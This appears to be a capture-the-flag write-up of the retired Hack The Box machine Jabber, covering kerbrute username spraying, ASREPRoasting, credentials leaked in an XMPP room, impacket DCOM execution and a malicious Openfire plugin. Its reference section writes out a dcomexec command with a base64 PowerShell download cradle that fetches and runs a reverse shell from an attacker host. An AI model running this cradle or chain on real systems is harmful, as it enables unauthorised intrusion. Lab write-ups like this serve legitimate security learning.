---
title: "HTB: Jabber"
date: 2026-10-02
draft: false
tags: ["htb", "windows", "active-directory", "asreproast", "xmpp", "dcom", "openfire"]
cover:
  image: /images/htb-jabber-cover.jpg
  alt: "Chat bubbles dissolving into Kerberos tickets, green on black"
  relative: false
---

Jabber. Windows, medium, retired. The chain in one line: username spraying → ASREPRoasting → a leaked password in an XMPP chat room → DCOM exec → a malicious Openfire plugin.

But the box isn't really about the chain. It's about a chat server that shows different faces depending on who's asking.

## Initial access

There's Jabber/XMPP running on 5222. First thing I tried was creating and registering an account with the server using Pandion — it worked, but nothing interesting was visible from a fresh account. A stranger gets the lobby and nothing else.

kerbrute with a statistically-common-usernames wordlist (jsmith.txt) got a bunch of hits. Some users were ASREP-roastable, and jmontgomery's hash was crackable. BloodHound showed jmontgomery couldn't do anything — dead end as a principal, useful as a login.

Logged into the Jabber server with jmontgomery's creds and listed the rooms again: `pentest2003@conference.jabber.htb` showed up. It hadn't been visible from the custom registered account. Joined it, and one of the chats contained credentials for svc_openfire. BloodHound showed svc_openfire was in "Distributed COM Users" — research suggested impacket's dcomexec.py, and fiddling with the command eventually worked. Shell as svc_openfire.

The part worth remembering: re-enumerate after every credential. The room was always there; I just couldn't see it as a nobody.

## Root: the Openfire plugin

There was an internal Openfire admin interface on 9090. Tunneled to it with chisel, and the svc_openfire creds worked on the admin panel. Research suggested a malicious plugin could be uploaded for code execution — found one, uploaded it, and got code execution as SYSTEM.

---

## Takeaways

Two things worth keeping. First, services that gate visibility by identity — chat rooms here, but the pattern shows up everywhere — mean your enumeration is only as good as your current credential. Every new login is a reason to re-list everything. Second, dcomexec's object parameter is fiddly: if the default DCOM object doesn't work, try the others (ShellWindows, etc.) before concluding the technique is dead.

---

## Reference

A few things worth keeping from this box's notes:

**dcomexec.** If you own a user who is a member of the "Distributed COM Users" group, you may be able to get RCE with impacket's dcomexec.py. If the default object doesn't work, try the other objects. The `-silentcommand` flag with a base64-encoded PowerShell download cradle keeps it quiet:

<div class="terminal">
<div class="terminal-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="fname">dcomexec-note.txt</span></div>
<div class="terminal-body"><pre>impacket-dcomexec -dc-ip &lt;dc-ip&gt; -object MMC20 \
  &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;dc&gt; -debug \
  -silentcommand 'powershell -enc &lt;base64&gt;'

# the base64 payload:
echo "iex(New-Object Net.WebClient).DownloadString('http://&lt;attacker-ip&gt;:&lt;port&gt;/&lt;revshell.ps1&gt;')" \
  | iconv -f utf-8 -t utf-16le | base64 -w0</pre></div>
<div class="vim-status"><span>"dcomexec-note.txt" [readonly] 7L</span><span>1,1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All</span></div>
</div>

**ldapsearch with TLS.** If you get `ldap_bind: Strong(er) authentication required ... The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection`, use `-H ldaps://`. If that doesn't work, `LDAPTLS_REQCERT=never` may help.

**Openfire malicious plugin.** If you get access to an Openfire web interface, you may be able to upload a malicious plugin (.jar) for code execution as the service account.
